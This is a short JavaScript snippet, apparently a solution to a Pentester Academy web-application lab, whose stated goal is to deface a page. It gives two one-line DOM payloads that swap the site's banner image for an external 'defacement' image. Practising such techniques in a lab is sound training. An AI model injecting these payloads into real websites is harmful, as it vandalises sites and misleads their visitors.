// https://pentesteracademylab.appspot.com/lab/webapp/jfp/11

// Objectives:
//     Replace the Pentester Academy Banner image with a Defacement Image

// Use this 
document.images[0].src='https://www.malwarebytes.com/easset_upload_file37080_257416_e.jpeg';

// OR this
// document.getElementsByTagName('img')[0].src='https://www.malwarebytes.com/easset_upload_file37080_257416_e.jpeg';